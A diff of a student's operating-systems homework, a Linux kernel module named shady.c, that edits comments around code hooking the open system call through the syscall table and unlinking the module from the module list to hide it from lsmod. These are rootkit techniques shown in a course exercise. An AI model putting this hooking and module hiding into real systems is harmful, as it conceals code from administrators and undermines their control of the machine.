@@ -1,5 +1,6 @@
 // Jakub Szpunar CS5460 HW4 shady.c
 // Modified code exists in __init, __exit, my_open and old_open
+// EXTRA CREDIT functionality is included.
 
 
 /* cfake.c - implementation of a simple module for a character device 
@@ -258,9 +259,11 @@ shady_init_module(void)
   // Set the location of the open function to my_open.
   system_call_table[__NR_open] = (unsigned int)my_open;
 
-  // EXTRA CREDIT LINE, remove this module from the list of
-  // modules, effectively hides form lsmod and hidden from
+  // EXTRA CREDIT. Remove this module from the list of
+  // modules, effectively hiding from lsmod and hidding from
   // /proc/modules. rmmod no longer works because of this.
+  // However, this does not remove the module from /sys/module
+  // and the module can be seen there after insmod
   list_del(&THIS_MODULE->list);
 
   if (shady_ndevices <= 0)
